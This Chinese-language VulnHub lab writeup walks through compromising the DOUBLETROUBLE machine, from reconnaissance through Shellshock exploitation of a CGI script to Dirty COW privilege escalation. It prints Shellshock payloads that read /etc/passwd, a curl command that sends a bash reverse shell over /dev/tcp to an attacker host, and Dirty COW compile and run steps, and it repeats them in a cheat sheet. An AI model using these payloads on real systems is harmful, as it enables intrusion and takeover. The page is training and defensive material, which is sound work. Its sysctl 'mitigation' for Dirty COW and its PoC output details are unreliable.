---
title: VulnHub DOUBLETROUBLE 靶机渗透测试复现：Shellshock 初始入侵与 Dirty COW 本地提权
description: 完整复现 VulnHub DOUBLETROUBLE 靶机渗透测试全链路：利用 Shellshock (CVE-2014-6271) 通过
  CGI-BIN 获取初始 Shell，再通过 Dirty COW (CVE-2016-5195) 本地提权漏洞提升至 root 权限。涵盖信息收集、漏洞验证、利用代码编译执行的完整实战流程。
category: program-analysis
tags:
- VulnHub
- Shellshock
- CVE-2014-6271
- Dirty COW
- CVE-2016-5195
- Privilege Escalation
- Penetration Testing
- OSCP
- Writeup
- Linux Exploitation
date: '2023-04-16'
updated: '2026-11-14'
---

## 靶机概况

- **靶机名称**：DOUBLETROUBLE
- **平台**：VulnHub
- **项目地址**：https://www.vulnhub.com/entry/doubletrouble-1,743/
- **难度**：中等
- **核心漏洞链**：
  1. **Shellshock (CVE-2014-6271)** — Bash 环境变量注入，实现远程命令执行（初始入侵）
  2. **Dirty COW (CVE-2016-5195)** — Linux 内核竞态条件写时复制机制缺陷，实现本地提权（权限提升）

> 适合 OSCP 风格实战练习，覆盖 Web 层漏洞利用与内核层提权的经典组合。

---

## 信息收集与攻击面识别

### 目标发现与端口扫描

使用 `netdiscover` 或 `arp-scan` 定位目标 IP，随后以 `nmap` 进行全端口服务枚举：

```bash
nmap -sV -p- 192.168.180.134
```

**开放端口与服务**：

| 端口 | 服务 | 版本/备注 |
|------|------|-----------|
| 22   | SSH  | OpenSSH   |
| 80   | HTTP | Apache httpd |

### Web 目录枚举

使用 `dirsearch` 对 Web 根目录进行暴力枚举：

```bash
dirsearch -u http://192.168.180.134 -e "*"
```

**关键发现**：

```
http://192.168.180.134/cgi-bin/ (CODE:403|SIZE:291)
http://192.168.180.134/index (CODE:200|SIZE:177)
http://192.168.180.134/index.html (CODE:200|SIZE:177)
http://192.168.180.134/server-status (CODE:403|SIZE:296)
```

`/cgi-bin/` 目录存在且返回 403，提示 CGI 脚本执行环境可用，成为 Shellshock 利用的潜在入口。

### 漏洞扫描确认

使用 `nikto` 对目标进行 Web 漏洞扫描，直接报告 **Shellshock (CVE-2014-6271)** 疑似存在：

```bash
nikto -h http://192.168.180.134
```

---

## 初始入侵：Shellshock (CVE-2014-6271) 利用

### 漏洞原理简述

Shellshock 允许攻击者通过构造恶意环境变量（如 `User-Agent`、`Referer` 等 HTTP 头），在 Bash 解析函数定义时执行任意命令。经典 Payload 结构：

```bash
() { :; }; /bin/bash -c "command"
```

### 实战验证与利用

使用 Burp Suite 拦截请求，修改 `User-Agent` 头注入测试命令：

```http
GET /cgi-bin/test HTTP/1.1
Host: 192.168.180.134
User-Agent: () { :; }; echo; /bin/cat /etc/passwd
```

或直接使用 `curl` 验证：

```bash
curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://192.168.180.134/cgi-bin/test
```

成功回显 `/etc/passwd` 内容，确认命令执行可行。

### 反弹 Shell 获取交互会话

构造反弹 Shell Payload（攻击机监听 `nc -lvnp 4444`）：

```bash
curl -A "() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.180.128/4444 0>&1'" http://192.168.180.134/cgi-bin/test
```

获得 `www-data` 权限的交互式 Shell。

> **同类技术参考**：[[vulnhub-sar-writeup]] 中亦通过 sar2HTML RCE 获取初始 Shell；[[glasgowsmile-vulnhub-writeup]] 则利用 Joomla 爆破后上传 Webshell。

---

## 权限维持与本地枚举

### 用户与环境确认

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# sumo:x:1000:1000:sumo,,,:/home/sumo:/bin/bash
```

目标存在 `sumo` 普通用户与 `root`。

### 内核版本与编译工具链检查

```bash
uname -a
# Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux

which gcc
# /usr/bin/gcc
```

内核 3.2.0 处于 Dirty COW (CVE-2016-5195) 影响范围（≥ 2.6.22，修复于 4.8.3/4.7.9/4.4.26 等），且本地有 `gcc` 可编译利用代码。

### SUID 二进制枚举

```bash
find / -perm -u=s -type f 2>/dev/null
```

未发现可直接利用的异常 SUID 程序，转向内核漏洞提权。

> **同类枚举技巧**：[[vulnhub-infosecprep-oscp-writeup]] 通过 SUID `bash` 直接提权；[[vulnhub-hard-socnet2-writeup]] 结合 CVE-2021-3493 与二进制溢出提权。

---

## 本地提权：Dirty COW (CVE-2016-5195) 利用

### 漏洞原理简述

Dirty COW 利用 Linux 内存管理中「写时复制」（Copy-on-Write）的竞态条件：多线程并发访问同一只读内存映射文件，在页表项更新与权限检查的时间窗口内，将只读映射转为可写，实现对 root 所有文件（如 `/etc/passwd`）的非授权修改。

详细机制可参考 [[linux-kernel-hardening-mechanisms]] 中关于内存保护与竞态缓解的章节。

### 利用代码获取与编译

经典 PoC：`dirtyc0w.c`（将 `/etc/passwd` 中 `root` 密码替换为已知 hash）。

```bash
# 下载或手写 PoC（此处略，常用版本见 github.com/dirtycow/dirtycow.github.io）
gcc -pthread dirtyc0w.c -o dirtyc0w
chmod +x dirtyc0w
```

### 执行提权

```bash
./dirtyc0w
# 输出示例：
# /etc/passwd successfully backed up to /tmp/passwd.bak
# Please run: su root -p
# Password: dirtyCowFun
```

按提示切换用户：

```bash
su root -p
# 输入密码: dirtyCowFun
# id
# uid=0(root) gid=0(root) groups=0(root)
```

成功获取 root 权限。

> **同类内核提权**：[[vulnhub-sar-writeup]] 使用 CVE-2021-3493 (overlayfs)；[[vulnhub-hard-socnet2-writeup]] 亦复现 CVE-2021-3493；[[vulnhub-dawn2-writeup]] 则为 Windows 缓冲区溢出提权。

---

## 完整攻击链总结

| 阶段 | 技术/漏洞 | 关键工具/命令 | 产出 |
|------|-----------|---------------|------|
| 信息收集 | 端口扫描、目录枚举、漏洞扫描 | `nmap`、`dirsearch`、`nikto` | 发现 `/cgi-bin/` 与 Shellshock |
| 初始入侵 | Shellshock (CVE-2014-6271) | `curl`/`Burp Suite` 修改 `User-Agent` | `www-data` Shell |
| 本地枚举 | 用户/内核/SUID 检查 | `uname -a`、`cat /etc/passwd`、`find` | 确认内核版本可受 Dirty COW 影响 |
| 权限提升 | Dirty COW (CVE-2016-5195) | `gcc` 编译 PoC、执行 `./dirtyc0w` | `root` Shell |

---

## 防御与缓解建议

1. **Shellshock (CVE-2014-6271)**
   - 升级 Bash 至修复版本（≥ 4.3.30）
   - 禁用不必要的 CGI 脚本，或迁移至非 Bash 解释器
   - WAF/IDS 部署针对 `() { :; };` 特征的规则

2. **Dirty COW (CVE-2016-5195)**
   - 升级内核至 ≥ 4.8.3 / 4.7.9 / 4.4.26 / 3.16.38 / 3.18.44 / 3.2.82（各长期维护分支）
   - 若无法立即升级，可通过 `sysctl -w vm.dirty_writeback_centisecs=0` 缩短脏页回写窗口（仅缓解，非根治）
   - 部署内核运行时保护模块（如 Grsecurity/PaX 的 `KERNEXEC`、`UDEREF`），参考 [[linux-kernel-hardening-mechanisms]]

3. **通用加固**
   - 最小化暴露攻击面：关闭不必要的 Web 目录（`/cgi-bin/`）、服务
   - 定期扫描已知 CVE（`nikto`、`openvas`、`nessus`）
   - 审计 SUID/SGID 程序，移除非必要特权二进制

---

## 交叉引用与延伸阅读

- **VulnHub 靶机系列**：[[vulnhub-platform-resource-index]]、[[vulnhub-bbs-cute-102-writeup]]、[[vulnhub-dawn2-writeup]]、[[vulnhub-hard-socnet2-writeup]]、[[vulnhub-infosecprep-oscp-writeup]]、[[vulnhub-sar-writeup]]、[[glasgowsmile-vulnhub-writeup]]
- **Linux 内核利用与防护**：[[linux-kernel-hardening-mechanisms]]、[[peda-buffer-overflow-analysis-guide]]、[[rop-linux-x86-beginner-tutorial]]
- **Web 漏洞利用实战**：[[edu-src-penetration-test-case-study]]（文件上传绕过、XSS、Getshell）

---

## 备忘：关键命令速查表

```bash
# 1. 目标发现
netdiscover -r 192.168.180.0/24

# 2. 端口与服务枚举
nmap -sV -sC -p- 192.168.180.134

# 3. Web 目录枚举
dirsearch -u http://192.168.180.134 -e php,html,sh,cgi,txt,bak -r

# 4. Shellshock 验证
curl -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd" http://192.168.180.134/cgi-bin/test

# 5. 反弹 Shell (攻击机: nc -lvnp 4444)
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.180.128/4444 0>&1'" http://192.168.180.134/cgi-bin/test

# 6. 本地枚举
uname -a && cat /etc/passwd && find / -perm -u=s -type f 2>/dev/null

# 7. Dirty COW 编译与执行
gcc -pthread dirtyc0w.c -o dirtyc0w && ./dirtyc0w

# 8. 提权后操作
su root -p  # 密码: dirtyCowFun
```

---

*本页面基于微信公众号归档文章整理，旨在构建结构化、可交叉引用的渗透测试知识库。实战中请严格遵守法律法规与授权范围。*

## 来源

- [0x00实验室-202108-202304_025](../sources/0x00实验室-202108-202304_025.md)
